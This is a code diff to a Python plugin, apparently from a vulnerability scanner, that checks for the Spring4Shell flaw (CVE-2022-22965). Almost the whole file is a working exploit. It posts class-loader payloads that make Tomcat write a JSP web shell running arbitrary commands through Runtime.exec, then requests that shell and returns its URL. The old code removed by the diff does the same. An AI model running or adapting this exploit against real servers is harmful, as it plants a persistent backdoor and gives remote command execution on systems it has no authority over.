@@ -1,34 +1,65 @@
 import requests
 import re
-from urllib.parse import urljoin
+import random, string
+import time
+import urllib
 
 
 def verify(url):
     relsult = {
-        'name': 'Spring Framework 远程命令执行漏洞(2022.3)',
+        'name': 'Spring Framework 远程命令执行漏洞(CVE-2022-22965)',
         'vulnerable': False,
         'attack': True,
     }
-    headers = {"suffix":"%>//",
-                "c1":"Runtime",
-                "c2":"<%",
-                "DNT":"1",
-                "Content-Type":"application/x-www-form-urlencoded"
-
+    post_headers = {
+        "Content-Type": "application/x-www-form-urlencoded"
     }
-    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+
+    get_headers = {
+        "prefix": "<%",
+        "suffix": "%>//",
+        # This may seem strange, but this seems to be needed to bypass some check that looks for "Runtime" in the log_pattern
+        "c": "Runtime",
+    }
+    directory = 'webapps/ROOT'
+    filename = ''.join(random.sample(string.digits + string.ascii_letters, 7))
+    webshell = urllib.parse.urljoin(url, filename + '.jsp?cmd=')
+
     try:
-        go = requests.post(url, headers=headers, data=data, timeout=10, allow_redirects=False, verify=False)
-        webshell = urljoin(url, 'tomcatwar.jsp')
-        rep1 = requests.get(f'{webshell}?pwd=j&cmd=whoami', timeout=4, allow_redirects=False, verify=False)
-        rep2 = requests.get(f'{webshell}?pwd=&cmd=whoami', timeout=4, allow_redirects=False, verify=False)
-        if rep1.status_code == 200 and re.search('//', rep1.text) and go.status_code == 200 and len(rep1.text) > len(rep2.text):
-            relsult['vulnerable'] = True
-            relsult['url'] = url
-            relsult['webshell'] = webshell + '?pwd=j&cmd=whoami'
-            relsult['about'] = 'https://github.com/liudonghua123/spring-core-rce/blob/main/spring-core-rce-exp.py'
+        log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
+                      f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
+                      f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
+                      f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"
+
+        log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
+        log_file_dir = f"class.module.classLoader.resources.context.parent.pipeline.first.directory={directory}"
+        log_file_prefix = f"class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}"
+        log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+
+        exp_data = "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])
+        file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
+
+        ret1 = requests.post(url, headers=post_headers, data=file_date_data, verify=False, timeout=6)
+        if ret1.status_code == 200:
+            ret2 = requests.post(url, headers=post_headers, data=exp_data, verify=False, timeout=6)
+            if ret2.status_code == 200:
+                # Changes take some time to populate on tomcat
+                time.sleep(3)
+                ret3 = requests.get(url, headers=get_headers, verify=False, timeout=6)
+                if ret3.status_code == 200:
+                    time.sleep(1)
+                    pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
+                    ret4 = requests.post(url, headers=post_headers, data=pattern_data, verify=False, timeout=3)
+                    time.sleep(5)
+                    check = requests.get(webshell, timeout=10)
+                    check2 = requests.get(urllib.parse.urljoin(url, ''.join(random.sample(string.digits + string.ascii_letters, 5))), timeout=10)
+                    if ret4.status_code == 200 and check2.status_code != check.status_code or check.status_code == 500:
+                        relsult['vulnerable'] = True
+                        relsult['url'] = url
+                        relsult['webshell'] = webshell
+                        relsult['about'] = 'https://github.com/reznok/Spring4Shell-POC/blob/master/exploit.py,' \
+                                           'https://github.com/liudonghua123/spring-core-rce/blob/main/spring-core-rce-exp.py'
         return relsult
     except:
         return relsult
-
 
